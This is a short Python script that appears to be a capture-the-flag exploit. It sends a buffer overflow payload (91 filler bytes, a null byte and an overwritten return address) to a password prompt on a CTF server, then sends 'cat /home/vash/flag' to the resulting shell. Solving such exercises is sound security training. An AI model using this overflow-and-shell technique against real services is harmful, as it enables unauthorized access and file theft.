import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("csie.ctf.tw", 10113))

while 1 :
    data = s.recv(1024)
    print "RECV(", len(data), "): " + data
    if data == "Enter password: " :
        message = 'A' * 91 + "\0" + "\x89\x86\x04\x08" + "\n"
        print "SEND(", len(message), "): " + message
        s.sendall(message)
    else :
        message = 'cat /home/vash/flag' + "\0" + "\n"
        print "SEND(", len(message), "): " + message
        s.sendall(message)

s.close()
